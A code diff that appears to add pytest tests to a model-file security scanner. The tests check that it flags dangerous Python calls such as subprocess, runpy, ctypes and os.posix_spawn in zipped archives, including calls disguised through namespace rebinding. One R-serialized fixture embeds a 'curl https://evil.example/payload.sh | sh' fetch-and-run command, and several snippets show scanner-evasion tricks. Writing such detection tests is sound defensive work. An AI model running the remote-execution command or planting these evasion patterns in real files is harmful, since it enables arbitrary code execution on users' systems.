@@ -307,6 +307,24 @@ def test_scan_zip_flags_wildcard_import_dangerous_python_member(tmp_path: Path) 
     assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"
 
 
+def test_scan_zip_preserves_subprocess_after_asyncio_wildcard_import(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "import subprocess\nfrom asyncio import *\nsubprocess.run(['echo', 'hidden'], check=False)\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].severity == IssueSeverity.WARNING
+    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"
+
+
 def test_scan_zip_flags_builtins_getattr_keyword_call_dangerous_python_member(tmp_path: Path) -> None:
     archive_path = tmp_path / "model_bundle.zip"
     source = "import builtins as bi\nimport os\nbi.getattr(object=os, name='system').__call__('echo hidden')\n"
@@ -473,6 +491,169 @@ def test_scan_zip_reports_rebound_namespace_callable_target(tmp_path: Path) -> N
     assert python_checks[0].details["reason"] == "high-risk calls: os.popen"
 
 
+def test_scan_zip_flags_namespace_bound_os_process_launch(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = (
+        "import os\n"
+        "namespace = os.__dict__\n"
+        "namespace['launch'] = os.posix_spawn\n"
+        "namespace['launch']('/bin/sh', ['sh'], {})\n"
+    )
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S101"
+    assert python_checks[0].details["reason"] == "high-risk calls: os.posix_spawn"
+
+
+@pytest.mark.parametrize(
+    ("source", "dangerous_name"),
+    [
+        (
+            "import asyncio\nasyncio.create_subprocess_exec('/bin/sh', '-c', 'id')\n",
+            "asyncio.create_subprocess_exec",
+        ),
+        (
+            "from asyncio import create_subprocess_shell as run\nrun('id')\n",
+            "asyncio.create_subprocess_shell",
+        ),
+        (
+            "import asyncio.subprocess\nasyncio.subprocess.create_subprocess_shell('id')\n",
+            "asyncio.subprocess.create_subprocess_shell",
+        ),
+        (
+            "import asyncio\nasyncio.create_subprocess_shell = len\nasyncio.create_subprocess_shell([])\n",
+            "asyncio.create_subprocess_shell",
+        ),
+    ],
+)
+def test_scan_zip_flags_asyncio_subprocess_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S103"
+    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
+
+
+@pytest.mark.parametrize(
+    ("source", "dangerous_name"),
+    [
+        ("import runpy\nrunpy._run_module_as_main('payload')\n", "runpy._run_module_as_main"),
+        ("import runpy\nrunpy.run_module('payload')\n", "runpy.run_module"),
+        ("from runpy import run_path as run\nrun('payload.py')\n", "runpy.run_path"),
+    ],
+)
+def test_scan_zip_flags_runpy_execution_python_member(tmp_path: Path, source: str, dangerous_name: str) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S108"
+    assert python_checks[0].details["reason"] == f"high-risk calls: {dangerous_name}"
+
+
+def test_scan_zip_flags_webbrowser_and_ctypes_python_member(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = (
+        "import ctypes\n"
+        "import webbrowser\n"
+        "webbrowser.get().open.__call__('https://example.invalid')\n"
+        "ctypes.cdll['msvcrt'].printf(b'x')\n"
+        "ctypes.cdll.__getitem__('msvcrt')\n"
+        "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
+        "loader.msvcrt.printf(b'x')\n"
+    )
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    checks_by_rule = {check.rule_code: check for check in python_checks}
+    assert set(checks_by_rule) == {"S109", "S110"}
+    assert checks_by_rule["S109"].severity == IssueSeverity.CRITICAL
+    assert checks_by_rule["S109"].details["reason"] == "high-risk calls: webbrowser.open"
+    assert checks_by_rule["S110"].severity == IssueSeverity.CRITICAL
+    assert "ctypes.cdll.msvcrt" in checks_by_rule["S110"].details["reason"]
+    assert "ctypes.LibraryLoader.msvcrt" in checks_by_rule["S110"].details["reason"]
+
+
+def test_scan_zip_flags_extensionless_runpy_python_member(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler", "import runpy\nrunpy.run_module('payload')\n")
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S108"
+    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_module"
+
+
+def test_scan_zip_ignores_extensionless_runpy_near_match(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("notes", "documentation mentions runpy.run_module('payload')\n")
+
+    result = ZipScanner().scan(str(archive_path))
+
+    assert not any(
+        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_zip_preserves_possible_runpy_execution_after_conditional_overwrite(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model_bundle.zip"
+    source = "import runpy\nif replace:\n    runpy.run_path = len\nrunpy.run_path('payload.py')\n"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr("handler.py", source)
+
+    result = ZipScanner().scan(str(archive_path))
+
+    python_checks = [
+        check
+        for check in result.checks
+        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
+    ]
+    assert len(python_checks) == 1
+    assert python_checks[0].rule_code == "S108"
+    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"
+
+
 @pytest.mark.parametrize(
     "source",
     [
@@ -511,6 +692,9 @@ def test_scan_zip_reports_rebound_namespace_callable_target(tmp_path: Path) -> N
         "import os\nglobals()['runner'] = os.system\nglobals().pop('runner')\nrunner('safe')\n",
         "import os\nos.__dict__['runner'] = os.system\nos.__dict__.pop('runner')\nos.runner('safe')\n",
         ("import os\nrunner = os.system\nif True:\n    globals()['runner'] = print\nglobals()['runner']('safe')\n"),
+        "import runpy\nrunpy.run_path = len\nrunpy.run_path([])\n",
+        "import webbrowser\nwebbrowser.get = len\nwebbrowser.get([]).open('https://example.invalid')\n",
+        "import ctypes\nctypes.cdll = len\nctypes.cdll['msvcrt'].printf(b'x')\n",
     ],
 )
 def test_scan_zip_ignores_benign_namespace_mapping_call(tmp_path: Path, source: str) -> None:
@@ -1240,6 +1424,7 @@ def test_scan_zip_ignores_benign_python_file_operations(tmp_path: Path) -> None:
         ("import os\nos.popen('echo hidden')\n", "S101", "os.popen"),
         ("import subprocess\nsubprocess.run(['echo'], check=False)\n", "S103", "subprocess.run"),
         ("import importlib\nimportlib.import_module('os')\n", "S107", "importlib.import_module"),
+        ("import runpy\nrunpy.run_path('payload.py')\n", "S108", "runpy.run_path"),
         ("eval('1 + 1')\n", "S104", "eval"),
         ("import pickle\npickle.loads(b'\\x80\\x04N.')\n", "S213", "pickle.loads"),
         ("__import__('os').system('echo hidden')\n", "S106", "__import__"),
@@ -1629,6 +1814,33 @@ def test_scan_nested_file_merges_torch7_security_analysis_for_signature_valid_bi
     assert result.metadata["supplemental_scanners"] == ["torch7"]
     assert any(
         check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_merges_r_serialized_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.bin"
+    extracted_member.write_bytes(
+        b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
+        b"base::system('curl https://evil.example/payload.sh | sh')\n"
+        b"\x7fELF" + b"\x00" * 128
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["r_serialized"]
+    assert any("Linux executable" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Executable Symbol Context Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Serialized Expression Payload Detection"
         and check.status == CheckStatus.FAILED
         and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
